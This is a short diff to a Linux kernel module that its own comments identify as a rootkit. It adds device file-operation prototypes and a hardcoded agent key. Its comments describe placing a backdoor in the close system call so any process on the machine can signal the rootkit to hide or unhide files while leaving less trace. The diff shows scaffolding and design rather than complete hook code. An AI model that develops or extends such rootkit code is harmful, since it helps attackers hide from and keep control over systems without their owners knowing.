@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/string.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
@@ -16,6 +17,23 @@
 #include <linux/proc_ns.h>
 #include <linux/sched.h>
 
+//prototype our device functions
+
+static int dev_open(struct inode *, struct file *);
+static int dev_rls(struct inode *, struct file *);
+static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
+static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
+
+
+static struct file_operations fops = 
+{
+	.read = dev_read,
+	.open = dev_open,
+	.write = dev_write,
+	.release = dev_rls,
+};
+
+
 struct linux_dirent {
     unsigned long   d_ino;
     unsigned long   d_off;
@@ -23,7 +41,15 @@ struct linux_dirent {
     char            d_name[1];
 };
 
+//Instead of creating a user as a backdoor, we'll be putting a backdoor in the close system call
+//This allows any code running anywhere on the machine to communicate with our rootkit
+//Having 1 less user also means leaving less of a trace
+//The backdoor is used primarily for hiding and unhiding files 
+//but can be expanded in the future.
+
 int agentpid = NULL;
+
+//Really need to eventually move this shit to a config file
 
 int agentKey = 66432;
 
